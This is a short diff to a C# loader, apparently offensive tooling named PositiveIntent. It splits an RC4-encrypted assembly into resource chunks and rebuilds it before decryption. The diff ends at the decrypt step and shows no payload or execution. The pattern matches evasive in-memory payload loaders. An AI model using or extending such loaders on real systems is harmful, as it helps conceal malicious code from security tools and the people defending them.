@@ -1,4 +1,6 @@
-﻿using System;
+﻿using PositiveIntent.Properties;
+using System;
+using System.Collections.Generic;
 using System.Reflection;
 using System.Runtime.InteropServices;
 
@@ -8,7 +10,27 @@ namespace PositiveIntent
     {
         public static void LoadAssembly(string[] args)
         {
-            byte[] encryptedAssembly = Properties.Resources.File1;
+            //byte[] encryptedAssembly = Properties.Resources.File1;
+            var chunks = new List<byte[]>();
+
+            // Load all chunks from resources (they're stored as base64 in .resx but accessed as byte[])
+            chunks.Add(Resources.FileChunk1);
+
+            // Calculate total size
+            int totalSize = 0;
+                foreach (var chunk in chunks)
+                    totalSize += chunk.Length;
+
+                // Reconstruct original file
+                byte[] encryptedAssembly = new byte[totalSize];
+                int position = 0;
+
+                foreach (var chunk in chunks)
+                {
+                    Array.Copy(chunk, 0, encryptedAssembly, position, chunk.Length);
+                    position += chunk.Length;
+                }
+
             RC4 rc4 = new RC4(RC4.key);
 
             // Decrypt assembly
